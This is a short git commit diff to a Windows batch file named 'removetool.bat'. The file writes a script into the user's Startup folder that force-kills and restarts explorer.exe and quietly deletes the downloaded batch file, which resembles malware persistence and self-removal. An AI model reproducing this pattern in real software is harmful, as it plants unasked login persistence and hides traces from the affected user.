a0c85c5da0f8c151d778297ca3897dab3604b299
DagotwiXE <hagenakn804235n@gmail.com>
2026-09-13 05:02:58 -0700

    Update removetool.bat

--- removetool.bat
+++ removetool.bat
@@ -1,7 +1,5 @@
-@echo off
 set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 (
-    echo @echo off
     echo taskkill /F /IM explorer.exe
     echo explorer.exe
     echo del /f /q "%USERPROFILE%\Downloads\removetool.bat"
